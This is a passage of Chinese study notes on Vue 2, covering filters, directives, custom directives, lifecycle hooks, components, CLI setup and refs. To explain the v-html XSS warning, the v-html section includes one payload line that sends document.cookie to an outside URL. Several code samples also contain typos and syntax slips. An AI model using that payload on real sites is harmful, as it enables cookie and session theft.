~~~

实例：

~~~html
<template>
    <div class="test">
        <!-- 要过滤的数据，永远是第一个参数；通过filter函数，传递的参数，依次排在后面。 -->
        <p>{{ new Date() | filter_dateFormat }}</p>
        <p>{{ new Date() | filter_dateFormat('YYYY-MM-DD') }}</p>
        <p>{{ new Date() | filter_dateFormat('YYYY-MM-DD', count) }}</p>
    </div>
</template>
<script src="https://cdn.bootcss.com/moment.js/2.24.0/moment.js"></script>
<script>
    export default {
        data() {
            return {
                count: 10
            };
        },
        filters: {
            filter_dateFormat(date, format, count) {
                return (
                    moment(date).format(format || "YYYY-MM-DD HH:mm:ss") +(count ? " -- " + count : "")
                );
            }
        }
    };
</script>
~~~

[运行结果：](https://s1.ax1x.com/2022/04/29/LxkSeg.png)

​																			[![LxkSeg.png](https://s1.ax1x.com/2022/04/29/LxkSeg.png)](https://imgtu.com/i/LxkSeg)

### 4. 多个过滤器串联

> 如下代码：`filterA` 被定义为接收单个参数的过滤器函数，表达式 `message` 的值将作为参数传入到函数中。然后继续调用同样被定义为接收单个参数的过滤器函数 `filterB`，将 `filterA` 的结果传递到 `filterB` 中。

~~~JavaScript
{{ message | filterA | filterB }}
~~~

完整示例：

~~~html
<template>
    <div class="test">
        <p>{{price}}</p>
        <p>{{price | filter_addPricePrefix}}</p>
        <p>{{price | filter_addPricePrefix |filter_addPriceSuffix}}</p>
    </div>
</template>

<script>
    export default {
        data() {
            return {
                price: 100
            };
        },
        filters: {
            filter_addPricePrefix(value) {
                return "¥" + value;
            },
            filter_addPriceSuffix(value) {
                return value + "元";
            }
        }
    };
</script>

<style lang="scss" scoped>
    .test {
        color: black;
    }
</style>
~~~

[运行结果：](https://s1.ax1x.com/2022/04/29/LxkUTH.png)

​																			[![LxkUTH.png](https://s1.ax1x.com/2022/04/29/LxkUTH.png)](https://imgtu.com/i/LxkUTH)

### 5. 总结

过滤器：
定义：对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)。
语法:

1. 注册过滤器: Vue . filter(name, callback)或new Vue{filters;{}}
2. 使用过滤器: {{ xxx|过滤器名}} 或v-bind:属性 ='xxx|过滤器名”

备注:

1. 过滤器也可以接收额外参数、多个过滤器也可以串联
2. 并没有改变原本的数据，是产生新的对应的数据

## 十二. 其他Vue指令介绍

> 经过之前的学习我们已经学习了Vue的大部分指令，这里在对几个较为常用的指令进行介绍

### 1. v-text指令

> 向所在的标签中插入文本，其与插值语法的区别在于，该指令会直接替换容器中的内容。

~~~html
<body>
    <div>你好，{{name}}</div>
    <div v-text="name">你好</div>
</body>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        el: '#root',
        data:{
            name:'shi'
        }
    })
</script>
~~~

运行结果：`你好，shi`，`shi`

- 总结：

  作用：向其所在的节点中渲染文本内容。
  与插值语法的区别： v-text会 替换掉节点中的内容，{{xx}}则不会。

### 2. v-html指令

> 与v-text的功能一致，但`v-html`可以进行结构解析。即可以将定义的字符标签转换为HTML。

~~~html
<body>
    <!--准备好一个容器--> 
    <div id="root">
        <div v-html= "str"></div>
    </div>
</body>
<script type= "text/javascript" >
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        el:'#root'，
        data:{
        name: 'shi',
        str:'<p>你好啊! </p>'
</script>
~~~

运行后页面输出：**`你好啊！`**

~~~html
<a href=javascript:location.href= "http://www.baidu.com?"+document.cookie></a>
~~~

- 总结

  v-htm1指令：

  1. 作用:向指定节点中渲染包含html1结构的内容。
  2. 与插值语法的区别:
     - v-html会替换掉节点中所有的内容，{{xx}}则不会。
     - v-htm1可以识别htm1结构。
  3. 严重注意: v-htm1有 安全性问题! ! ! !
     - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
     - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上!

### 3. v-cloak指令

> v-cloak指令常常用在插值表达式的标签中，因为它可以解决当网络加载很慢时，或者频繁渲染时候，页面就会显示出源代码的情况。
>
> v-cloak原理是先通过样式隐藏内容，然后在内存中进行值的替换，将替换的内容再反馈给界面，数据渲染完场之后，v-cloak 属性会被自动去除。

~~~html
<style type="text/css">
    [v-cloak]{
        display: none;
    }
</style>
<h3 v-cloak>{{name}}</h3>
~~~

以上代码会在服务器加载完毕后在将v-cloak移除，达到显示标签的效果。

v-cloak指令(没有值) :

1. 本质是一个特殊属性，Vue实 例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时页面展示出{ {x}}的问题。

### 4. v-once指令

> v-once指令: 
>
> 1. v-once所在节点在初次动态渲染后，就视为静态内容了。
> 2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

~~~html
<body>
    <div id="root">
        <h2 v-once>初始化的n值是:{{n}</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click= "n++">点我n+1</button>
    </div>
</body>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        el: '#root',
        data:{
            n:1
        }
    })
</script>
~~~

以上代码执行之后，第一个`<h2>`标签只会读取一次n的值，后来n++不会对绑定`v-once`指令的标签造成影响。

### 5. v-pre指令

> v-pre指令:
>
> 1. 跳过其所在节点的编译过程。
> 2. 可利用它跳过:没有使用指令语法、没有使用插值语法的节点，会加快编译。

~~~html
<body>
    <div id="root">
        <h2 v-pre>初始化的n值是:{{n}</h2>
        <h2 v-pre>当前的n值是:{{n}}</h2>
        <button @click= "n++">点我n+1</button>
    </div>
</body>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        el: '#root',
        data:{
            n:1
        }
    })
</script>
~~~

运行结果：`初始化的n值是:{{n}`、`当前的n值是:{{n}}`页面不会进行编译，而是直接渲染。

## 十三. Vue的自定义指令

> 自定义指令需要在标签后以`v-指令名='表达式'`的形式绑定标签。之后要在Vue实例中用`directives`参数，书写指令表达式(自定义指令要干什么)。`directives`参数内的指令默认可以接收两个参数。也可以有两种写法：对象式和函数式。`directives`参数介绍如下：

|   参数名    |                      描述                       |
| :---------: | :---------------------------------------------: |
| element参数 | 获取网页绑定自定义标签的真实DOM(即获得绑定标签) |
| binding参数 |          绑定标签时表达式的值或者对象           |

### 1. 自定义指令的函数式写法

> 我们有一个需求：定义一个v-big指令,和v-text功能 类似，但会把绑定的数值放大10倍。代码如下：

~~~html
<body>
    <div id="root">
        <h2>当前的n值是: <span v-text="n"></span></h2>
        <h2>放大10倍后的n值是: <span v-big="n"></span></h2>
        <button @click="n++">点我n+1</button>
    </div>
</body>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        el:'#root',
        data:{
            n:1
        },
        directives :{
            //big函数何时会被调用?1.指令与元素成功绑定时(一上来)。2.指令所在的模板被重新解析时。
            big(element, binding){
                element.innerText = binding.value*10
            }
        }
    })
</script>
~~~

> 以上代码会在浏览器页面输出放大10倍后的n值。
>
> 其中我们在第4行给`<span>`标签绑定了一个自定义指令`v-big`并传递了一个参数n，在`directives`中定义指令语法。其中`big`的第一个参数为`<span>`节点元素，第二参数为data中的n对象。第18行代码让`<span>`标签中显示n*10后的值。
>
> big函数调用时机：
>
> 1. 指令与元素成功绑定时(一上来就调用)
> 2. 指令所在的模板被重新解析时。即Vue中的任何数据修改时。

### 2. 自定义指令的对象式写法

> 定义一个`v-fbind`指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。因为函数式的代码在刚上来的就被调用，此时`input`没有被Vue实例插入到页面，所以获取焦点会失败，这时我们就要用到对象式写法，以更精确的控制代码插入的时机。以下是代码：

~~~html
<body>
    <div id="root">
        <h2>当前的n值是: <span v-text="n"></span></h2>
        <h2>放大10倍后的n值是: <span v-big="n"></span></h2>
        <button @click="n++">点我n+1</button>
        <input type= "text" v-fbind:value="n">
    </div>
</body>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
    new Vue({
        el:'#root',
        data:{
            n:1
        },
        directives :{
            fbind:{
                //指令与元素成功绑定时(一上来)
                bind(element,binding){
                    element.value = binding. value 
                },
                //指令所在元素被插入页面时
                inserted(element,binding){
                    element.focus()
                },
                //指令所在的模板被重新解析时
                update(element,binding){
                    element.value = binding.value
                }
            }
        }
    })
</script>
~~~

此时我们就可以做到打开网页就获取输入框的焦点。

> 上面的代码中对象式的写法中默认有三个方法需要我们重写，分别是：`bind`、`inserted`、`update`他们详细说明如下：

|          方法名           |                描述                |
| :-----------------------: | :--------------------------------: |
|   bind(element,binding)   | 指令与元素成功绑定时(一上来就执行) |
| inserted(element,binding) |      指令所在元素被插入页面时      |
|  update(element,binding)  |     指令所在的模板被重新解析时     |

其中`bind`和`update`执行功能基本一致。我们有特殊业务的情况下是在`inserted`中配置业务。

### 3. 定义全局指令

> 与之前的定义过滤器的方法一样，我们要用到`Vm.directive('方法名',函数{})`

~~~JavaScript
//对象式
Vue.directive('fbind' ,{
    //指令与元素成功绑定时(一上来)
    bind(element , binding){
        element.value = binding 。value
    },
    //指令所在元素被插入页面时
    inserted(element , binding){
        element. focus( )
    },
    //指令所在的模板被重新解析时
    update(element, binding){
        element.value = binding. value
    }
}) 
//函数式
Vue.directive('big',function(element , binding){
    console.log('big' ,this) //注意此处的this是window
    element.innerText = binding.value*10
})
~~~

- 总结

  自定义指令总结:
  一. 定义语法:

  - 局部指令:
    directives:{指令名:配置对象}或directives:{指令名:回调函数}
  - 全局指令:
    Vue.directive(指令名，配置对象)或Vue. directive(指令名，回调函数)

  二、 配置对象中常用的3个回调:

  - bind:指令与元素成功绑定时调用。
  - inserted:指 令所在元素被插入页面时调用。
  - update:指令所在模板结构被重新解析时调用。

  三、备注:

  1. 指令定义时不加v-，但使用时要加V-
  2. 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

## 十四. Vue的生命周期

> 生命周期:
>
> 1. 又名:生命周期回调函数、生命周期函数、生命周期钩子。
> 2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
> 3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
> 4. 生命周期函数中的this指向是vm或组件实例对象
>
> 生命周期四个阶段：初始化、挂载、更新、销毁

### 1. 生命周期方法

|     方法名      |                             描述                             |
| :-------------: | :----------------------------------------------------------: |
|  beforeCreate   | 生命周期、事件，数据代理还未开始。此时：无法通过vm访问到data中的数据、methods中的方法。 |
|     created     | 数据检测，数据代理开始，此时：可以通过vm访问到data中的数据、methods中配置的方法。 |
|   beforeMount   | 页面呈现的是未经Vue编译的DOM结构。此时所有对DOM的操作，最终都不奏效。 |
|     mounted     | 页面中呈现的是经过Vue编译的DOM。此时对DOM的操作均有效(尽可能避免)。<br/>至此初始化过程结束，一般在此进行:开启定时器、发送网络请求、订阅消息、</br>绑定自定义事件、等初始化操作。 |
|  beforeUpdate   |  此时页面是旧的，但数据已经更新，还没有来的即转换为新的DOM   |
|     updated     |                    此时页面和数据保持同步                    |
|  beforeDestroy  | 此时: vm中所有的: data、methods、 指令等等，都处于可用状态，马上要执行销毁过程，一般在此阶段:关闭定时器、取消订阅消息、解绑自定义事件等收尾操作 |
|    destroyed    |            这里基本不写代码，代表Vue实例已经销毁             |
| this.$destroy() |           是beforeDestroy和destroyed两个方法的综合           |

[Vue生命周期图：](https://s1.ax1x.com/2022/04/30/OpJBqS.png)

​		[<img src="https://s1.ax1x.com/2022/04/30/OpJBqS.png" alt="OpJBqS.png" style="zoom:50%;" />](https://imgtu.com/i/OpJBqS)

### 2. 方法的使用

> 每一个方法就是一个Vue参数。与data平级

~~~JavaScript
Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
new Vue({
    el:'#root',
    data:{
        n:1
    },
    methods:{
        stop(){
            this.$destroy()
        }
    },
    beforeCreate(){},
    created(){},
    beforeMount(){},
    mounted(){},
    beforeUpdate(){},
    updated(){},
    beforeDestroy(){},
    destroyed(){}
})
~~~

- 总结：

  vm的一生( vm的生命周期) ：

  1. 将要创建`===>`调用beforeCreate函数。
  2. 创建完毕`===>` 调用created函数。
  3. 将要挂载`===>`调用beforeMount函数。
  4. (重要)挂载完毕`===>`调用mounted函数。`=============>` [重要的钩子]
  5. 将要更新`===>`调用beforeUpdate函数。
  6. 更新完毕`===>`调用updated函数。
  7. (重要)将要销毁`===>`调用beforeDestroy函数。`========>`[重要的钩子]
  8. 销毁完毕===>调用destroyed函数。

## 十五. 组件化

> 传统的web项目都是一个HTML页面中有顶部、底部、导航栏、内容四个模块，所以我们就要再准备四个css和四个js，这样会导致依赖关系混乱，不好维护，以及代码复用率不高等问题。此时，Vue的组件化编程就完美解决了这个问题，组件化编程体现了，封装的概念，将HTML的每个部分css、js等封装到一起，用时一起使用即可。
>
> 组件的定义：实现应用中局部功能的代码个资源的集合。组件尽量往细的拆分。
>
> 两种方式对比如下：

[传统方式编写web项目：](https://s1.ax1x.com/2022/05/01/O9BnpD.png)									[<img src="https://s1.ax1x.com/2022/05/01/O9BnpD.png" alt="O9BnpD.png" style="zoom:50%;" />](https://imgtu.com/i/O9BnpD)

[使用Vue组件化编写Web项目：](https://s1.ax1x.com/2022/05/01/O9Bb9O.png)											[<img src="https://s1.ax1x.com/2022/05/01/O9Bb9O.png" alt="O9Bb9O.png" style="zoom:50%;" />](https://imgtu.com/i/O9Bb9O)

### 1. 非单文件组件

> 用来实现局部(特定)功能效果的代码集合(htm/css/js/ima....)，其能复用编码，简化项目编码，提高运行效率。
>
> 组件理论上分为：非单文件组件和单文件组件(开发用的多)。

#### 1.1 非单文件组件的创建

> 指得是一个文件中包含n个组件。
>
> 在Vue中使用组件需要三步：创建组件、注册组件、使用组件

- 创建组件：

  > 创建组件需要用到一个`extend`的API，在这个API中编写和之前Vue实例中一样的内容，但要注意，这里不能写`el`参数，`data`也要用函数式表示，因为用对象式的话会导致有的组件修改对象中的数据，那么其他用到该数据的组件也会用到影响。组件可以有多个。同时也要用到`template`参数来定义页面标签

  ~~~JavaScript
  Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
  //创建school组件
  const school = Vue.extend({
      // el: '#root', //组件定义时，一定不要写e1配置项，因为最终所有的组件都要被个vm管理，由vm决定服务于哪个组件
      template:`
      <div> 
  		<h2>学校名称: {{schoolName}}</h2> 
  		<h2>学校地址: {{address}}</h2>
  	</div> `,
      data(){
          return {
              schoolName:'尚硅谷',
              address:'北京昌平'
          }
      }
  })
  
  //创建student组件
  const student = Vue.extend({
      template:`
      <div> 
  		<h2>学生姓名: {{ studentName}}</h2>
  		<h2>学生年龄: {{age}}</h2>
  	</div> `,
      data(){
          return{
              studentName: '张三',
              age:18 
          }
      }
  })
  ~~~

- 组件注册

  > 注册组件我们仍需要`new`一个Vue实例，在Vue实例中用`components`参数来配置子组件。这里面的第键为自定义组件名，值为我们之前创建组件时候的组件名。建议键值一样。同时也有全局注册和局部注册

  ~~~JavaScript
  //创建局部vm注册
  new Vue({
      el: '#root',
      //第二步:注册组件(局部注册)
      components:{
          xuexiao:school,
          xuesheng:student
      }
  })
  //全局注册组件
  Vue.component('xuexiao',school)
  ~~~

- 组件使用

  > 我们可以直接将组件注册中的`xuexiao`和`xuesheng`当标签用在页面

  ~~~html
  <body>
      <xuesheng></xuesheng>
      <xuexiao></xuexiao>
  </body>
  ~~~

- 完整代码

  ~~~html
  <body>
      <xuesheng></xuesheng>
      <hr/>
      <xuexiao></xuexiao>
  </body>
  <script>
  	Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
  //创建school组件
  const school = Vue.extend({
      // el: '#root', //组件定义时，一定不要写e1配置项，因为最终所有的组件都要被个vm管理，由vm决定服务于哪个组件
      template:`
      <div> 
  		<h2>学校名称: {{schoolName}}</h2> 
  		<h2>学校地址: {{address}}</h2>
  	</div> `,
      data(){
          return {
              schoolName:'尚硅谷',
              address:'北京昌平'
          }
      }
  })
  
  //创建student组件
  const student = Vue.extend({
      template:`
      <div> 
  		<h2>学生姓名: {{ studentName}}</h2>
  		<h2>学生年龄: {{age}}</h2>
  	</div> `,
      data(){
          return{
              studentName: '张三',
              age:18 
          }
      }
  })
  
  //创建vm
  new Vue({
      el: '#root',
      //第二步:注册组件(局部注册)
      components:{
          xuexiao:school,
          xuesheng:student
      }
  })
  </script>
  ~~~

  [运行结果：](https://s1.ax1x.com/2022/05/01/O9RTUJ.png)

  ​                                                                                 [<img src="https://s1.ax1x.com/2022/05/01/O9RTUJ.png" alt="O9RTUJ.png" style="zoom:33%;" />](https://imgtu.com/i/O9RTUJ)

- 总结：

  Vue中使用组件的三大步骤:

  - 定义组件(创建组件)
  - 注册组件
  -  使用组件(写组件标签)

  一、如何定义一个组件?

  使用Vue . extend( options )创建，其中options和new Vue( options )时传入的那个options几乎样， 但也有点区别
  区别如下:

  1. el不要写，最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。

  2. data必须写成函数，为什么? -_避 兔组件被复用时，数据存在引用关系。
  3. 备注：使用template 可以配置组件结构。

  二、如何注册组件?

  1. 局部注册:靠new Vue的时候传入components选项
  2. 全局注册:靠Vue. component( '组件名'，组件)

  三、编写组件标签: `<school></ school>`

#### 1.2 非单文件组件注意点

1. 关于组件名：
   一个单词组成：

   - 第一种写法(首 字母小写): school
   - 第二种写法(首字母大写): School

   多个单词组成:

   - 第一种写 法(kebab-case命 名): my-school 
   - 第二种写法(CamelCase命名): MySchool ( 需要Vue脚手架支持)

   备注:

   - 组件名尽可能回避HTML中已有的元素名称，例如: h2、 h2都不行。
   - 可以使用name配置项指定组件在开发者工具中呈现的名字。

2. 关于组件标签：

   - 第一种写法: `<school></ school>`
   - 第二种写法: `<school/>`

   备注:不用使用脚手架时，`<school/>` 会导致后续组件不能渲染。

3. 一个简写方式：
   const school = Vue. extend( options)可简写为: const school = options

### 2. 组件的嵌套

> 组件嵌套是将已经定义的组件放到另一个组件的`template`中，而不是放到HTML容器中。注册给谁就要把结构写在他的里面。具体操作如下：

创建父组件和子组件后，将子组件在父组件中注册。Vue实例中只用注册父组件(app)即可。注意：要先创建子组件之后撞见父组件。

~~~JavaScript
const 子组件 = Vue.extend({
    template:`
    <div> 
		<h2></h2>
    </div> `    
})

const 父组件 = Vue.extend({
    template:`
    <div> 
		<h2></h2>
		<!--将子组件添加到父组件中-->
		<zi></zi>
    </div> `,
    //在父组件中注册子组件
    components:{
        zi:子组件
    }
})

//创建vm
new Vue({
    el: '#root',
    components:{
        fu:父组件
    }
})
~~~



~~~html
<body>
    <xuexiao></xuexiao>
</body>
<script>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示。    
    //创建student组件
    const student = Vue.extend({
        template:`
    <div> 
		<h2>学生姓名: {{studentName}}</h2>
		<h2>学生年龄: {{age}}</h2>
    </div> `,
        data(){
            return{
                studentName: '张三',
                age:18 
            }
        }
    })

    //创建school组件
    const school = Vue.extend({
        // el: '#root', //组件定义时，一定不要写e1配置项，因为最终所有的组件都要被个vm管理，由vm决定服务于哪个组件
        template:`
    <div> 
		<h2>学校名称: {{schoolName}}</h2> 
		<h2>学校地址: {{address}}</h2>
		<xuesheng></xuesheng>
    </div> `,
        data(){
            return {
                schoolName:'尚硅谷',
                address:'北京昌平'
            }
        },
        components:{
            xuesheng:student
        }
    })

    //创建app组件
    const app=Vue.extend({
        components:{
            school:school
        }

    })
    //创建vm
    new Vue({
        el: '#root',
        template:`
    <div> 
		<app></app>
    </div> `,
        components:{
            app:app
        }
    })
</script>
~~~

> 在上面的代码中，创建了个组件管理由大到小依次是：`app`、`school`、`xuesheng`。简单说就是父子间中定义和控制子组件结构

[组件嵌套结果：](https://s1.ax1x.com/2022/05/02/OiLQgK.png)

​										[<img src="https://s1.ax1x.com/2022/05/02/OiLQgK.png" alt="OiLQgK.png" style="zoom:50%;" />](https://imgtu.com/i/OiLQgK)

### 3. VueComponent构造函数

关于VueComponent:
1. schoo1组件本质是一个 名为VueComponent的构造函数，且不是程序员定义的，是Vue . extend生成的。

2. 我们只需要写`<schoo1/>`或`<school></schoo1>`, Vue解析时会帮我们J创建school组件的实例对象，即Vue帮我们执行的: 

  new VueComponent(options)。

3. 特别注意:每次调用Vue. extend,返回的都是一一 个全新的VueComponent! ! ! !

4. 关于this指向: 
   (1) .组件配置中：

   - data函数、methods中的函 数、watch中 的函数、computed中的函数 它们的this均是[ VueComponent实例对象]。

   (2) .new Vue( options )配置中:

   - data函数、methods 中的函数、watch中 的函数、computed中的函 数它们的this均是[Vue实例对象]。

5. VueComponent的实例对象，以后简称vc (也可称之为:组件实例对象)。
   Vue的实例对象，以后简称vm。

### 4. Vue与VueComponent关系

> 我们之前讲过的prototype原型对象是指每个对象上都有一个`__proto__`隐式对象，该隐式对象总是指向对象缔造者的`__proto__`。最后再指向Object。Vue和VueComponent之间也有这种关系：

[Vue与VueComponent原型关系：](https://s1.ax1x.com/2022/05/02/OFkKXj.png)							[<img src="https://s1.ax1x.com/2022/05/02/OFkKXj.png" alt="OFkKXj.png" style="zoom:50%;" />](https://imgtu.com/i/OFkKXj)

上图中可以总结为：

~~~JavaScript
VueComponent.prototype.__proto__ === Vue.prototype
~~~

> 由上图我们可以得出Vue实例对象指向Vue缔造者(Vue原型)的原型对象上，最后指向了Object原型对象
>
> 而VueComponent的实例对象先指向缔造者VueComponent的原型对象上，再指向Vue的原型对象，最后才指向了Object对象。
>
> 假设我们在VueComponent实例对象上获取一个`a`变量，则会先在VueComponent实例对象上的`__proto__`中找，找不到再到VueComponent原型对象上找，接着是Vue的原型对象，最后才是Object。如果都找不到，则返回`undefind`

~~~html
<script>
    //在Vue原型上追加一个值x并初始化为99
    Vue.prototype.x = 99
    const app =Vue.extend({
        components:{
            school:school
        },
        methods: {
            showX(){
                console.log(this.x)
            }
        }
    })
    const vm=new Vue({})
</script>
~~~

上面代码`showX()`方法绑定执行后仍然可以输出x的值。

### 5. ==单文件组件==

> 一个文件名字是以.vue结尾，并且里边的内容就是一个组件，这个文件就称作**单文件组件**
>
> Vue文件有三个标签元素：`<template>`、`<script>`、`<style>`。他们相当于HTML、Javascript、css结构如下：

~~~vue
<template>
<!--组件的结构-->
</template>

<script>
//组件交互相关的代码(数据、方法等等)
</script>

<style>
/*组件的样式*/
</style>
~~~

> 其中如果别人的地方要用到该Vue文件就需要对该文件进行暴露处理，即将`<script>`内的JavaScript代码用默认暴露：
>
> `export default`

~~~vue
<script>
    export default Vue.extend({})
</script>
~~~

Vue案例示例：

- 首先创建一个School.vue文件，然后正常写代码。示例对象要配置name属性，方便`import`导入。`name`属性名尽量和文件名一致。

  ~~~vue
  <template>
  <div class=" demo">
      <h2>学校名称: {{schoolName}}</h2>
      <h2>学校地址: {{address}}</h2>
      <button @click=" showName" >点我提示学校名< /button>
      </div>
  </template>
  <script>
      export default{
          name:'School',
          data(){
              return {
                  schoolName:'shi',
                  address:'北京昌平'
              }
          },
          methods:{
              showName( ){
                  alert(this.schoolName)
              }
          },
      }
  </script>
  ~~~

- 创建一个Student.vue文件

  ~~~vue
  <template>
  <div class="demo">
      <h2>学校姓名: {{Name}}</h2>
      <h2>学校年龄: {{age}}</h2>
      <button @click="showName">点我提示学校名</button>
      </div>
  </template>
  <script>
      export default{
          name:'Student',
          data(){
              return {
                  Name:'zhang',
                  age:18
              }
          },
          methods:{
              showName( ){
                  alert(this.schoolName)
              }
          },
      }
  </script>
  ~~~

- 创建一个App.vue组件，用于汇总所有组件

  ~~~vue
  <template>
  <!--组件的结构-->
  	<School></School>
  	<Student></Student>
  </template>
  
  <script>
      //引入组件
      import School from './School'
      import Student from './Student '
      export default {
          name: 'App',
          components :{
              School:School,
              Student:Student
          }
      }
  </script>
  
  <style>
      /*组件的样式*/
  </style>
  ~~~

- 创建main.js文件用于控制文件结构

  ~~~JavaScript
  import App from './App.vue'
  new Vue({
      el:'#root',
      template:`<App></App>`,
      components: {App},
  })
  ~~~

- 创建一个idnex.html文件用于展示页面，同时要想展示页面数据还需要引入`main.js`文件，一般放在`</body>`标签上面，且要有`id='root'`的容器。

  ~~~html
  <html>
      <head>
          <meta charset="UTF-8"/>
          <title>练习一下单文件组件的语法</title> 
      </head>
      <body>
          <div id="root"></div>
          <script type="text/javascript" src="../js/vue.js"></script>
          <script type="text/javascript" src="./main.js"></script>
      </body>
  </html>
  ~~~

以上就是我们单文件组件的结构代码，这里还不能运行因为没有脚手架的支持，浏览器无法识别`import`语句，结构示意图如下：

[单文件结构示意图：](https://s1.ax1x.com/2022/05/03/OAez1x.png)

​										[![OAez1x.png](https://s1.ax1x.com/2022/05/03/OAez1x.png)](https://imgtu.com/i/OAez1x)

> 运行浏览器后打开index.html文件后先加载`main.js`文件，再依次递归执行`App.vue`、`School.vue`、`Student.vue`

## 十六. Vue脚手架的使用

> 脚手架是Vue官方提供的标准化开发工具。负责解析Vue文件，其作用和Tomcat一致。使Vue文件可以在浏览器中运行。首先要下载脚手架：

1. 在cmd窗口中输入，进行全局安装：

   ~~~shell
   npm install -g @vue/cli
   ~~~

   如出现下载缓慢请配置npm淘宝镜像:

   ~~~shell
   npm config set registry https://registry.npm.taobao.org
   ~~~

2. 切换到你==要创建项目的目录==，然后使用命令创建项目

   ~~~shell
   vue create xxx
   ~~~

3. 选择Vue版本

   [Vue版本：]([![OAK7G9.png](https://s1.ax1x.com/2022/05/03/OAK7G9.png)](https://imgtu.com/i/OAK7G9))

   ​												[<img src="https://s1.ax1x.com/2022/05/03/OAK7G9.png" alt="OAK7G9.png" style="zoom:50%;" />](https://imgtu.com/i/OAK7G9)

   [创建项目成功如下：](https://s1.ax1x.com/2022/05/03/OAMAqf.png)

   ​											[<img src="https://s1.ax1x.com/2022/05/03/OAMAqf.png" alt="OAMAqf.png" style="zoom:50%;" />](https://imgtu.com/i/OAMAqf)

4. 运行项目的代码是：

   ~~~shell
   npm	run	serve
   ~~~

### 1. Vue脚手架目录说明

- src目录下的

  1. main.js：该文件是整个项目的入口文件，该文加内容说明如下：

     ~~~JavaScript
     /*
     该文件是整个项目的入口文件
     */
     //引入Vue
     import Vue from 'vue'
     //引入App组件，它是所有组件的父组件
     import App from './App.vue'
     //关闭vue的生产提示
     Vue.config.productionTip = false
     //创建Vue实例对象---Vm 
     new Vue({
         el: '#app',
         //完成了这个功能:将App组件放入容器中
         render: h => h(App),
     })
     ~~~

  2. App.vue：组件管理文件。这里和之前项目中的编写方式一样

  3. assets：资源包，用来放一些静态的资源文件

  4. components：我们平时编写的Vue代码就放在这里

  5. public：这里存放静态的页面，还有一些网页的图标，代码如下：

     ~~~html
     <head>
         <meta charset="utf-8">
         <!--针对工E浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面-->
         <meta http- equiv= "X-UA- Compatible" content= "IE=edge">
         <!-- 开启移动端的理想视口-->
         <meta name="viewport" content= "width=device -width, initial-scale=1.0">
         <!-- 配置页签图标-->
         <link rel="icon" href="<%= BASE URL %>favicon.ico">
         <!--配置网页标题-->
         <title> <%= htmlWebpackPlugin.options.title %></title>
             </head>
         <html>
             <body>
                 <!-- 当浏览器不支持js时noscript中的元素就会被渲染-->
                 <noscript>
     				<strong>We're sorry but <%=htmlWebpackPlugin. options.title%></strong>
                 </noscript>
                 <!--容器-->
                 <div id="app"></div>
                 <!-- built files will be auto injected -->
             </body>
         </html>
     ~~~

[Vue脚手架文件结构图：](https://s1.ax1x.com/2022/05/03/OAdtuF.png)

​																[<img src="https://s1.ax1x.com/2022/05/03/OAdtuF.png" alt="OAdtuF.png" style="zoom: 50%;" />](https://imgtu.com/i/OAdtuF)

### 2. main.js中的render函数

> 我们在脚手架中默认的是残缺的Vue没有模板解析器，所以`template`参数不能用，这里时候我们要不将导入包路径改为`vue/dist/vue.js`，或者可以用内置的`render`函数(推荐)。使用方法如下：

~~~JavaScript
new Vue({
    el:"#app",
    render(createElement){
        return createElement('Element','value')
    }
})
~~~

该函数参数需要两个：第一个是插入的标签元素的类型，第二个是标签的值(内容)，该函数也可以简化为箭头函数写法：

~~~JavaScript
render:createElement=>createElement('h1' ,'你好啊')
~~~

关于不同版本的Vue:

1. vue.js与vue。runtime. xxx.js的区别:
   - vue.js是完整版的Vue,包含:核心功能+模板解析器。
   - vue.runtime.xx.js是运行版的Vue,只包含:核心功能;没有模板解析器。
2. 因为vue . runtime . xXxx. js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。

### 3. ref指令

> 在原生的DOM环境下我们采取获取DOM树的方式获取元素对象：`document.getElementById("id")`
>
> 上面的方式写起来麻烦，所以我们可以直接用ref指令给标签绑定ID或Class。然后在vc中用`this.ref.idName`的方式获取DOM结构

用法：

~~~html
Object.$refs.title
~~~

示例App.js：

~~~html
<body>
    <div ref="title" @click="showDOM"></div>
	<school ref='sch'><school>
    <script>
        //引入Schoo1组件
		import School from './components/School'

        //暴露vc示例对象：
        export default{
            methods: {
                showDOM(){
                    console. log(this.$refs.title) // 真实DOM元素
                    console. log(this.$refs.sch) //Schoo1组件 的实例对象(vC)
                }
            },
        }
    </script>
</body>
~~~

ref属性：

1. 被用来给元素或子组件注册引用信息(id的替代者)
2. 应用在htm1标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象(vc )
3. 使用方式:
   - 打标识：`<h1 ref="xxx">.... .</h1>`或`<School ref= "xxx"></School>`
   - 获取: this. $refs . xxx

### 4. props参数配置项

> 用于父子组件的标签传值，是数组或对象，props的成员是子组件接收的来自父组件的数据。简单说就是能让组件接收外部传来的数据。有三种书写方式：

传递数据方式：

~~~html
<!--父组件中：-->
<Demo name="xxx"></Demo>

<!--子组件中：-->
<h1>{{name}}</h1>
~~~

上面方式只是容器中的编写方式，要想实现组件之间的信息传递，还要在Vue实例中用props配置项配置接收参数。有三种配置方式，他们对数据的控制越来越精准。

~~~JavaScript
//第种方式(只接收) :
props:['name']
//第二种方式(限制类型) :
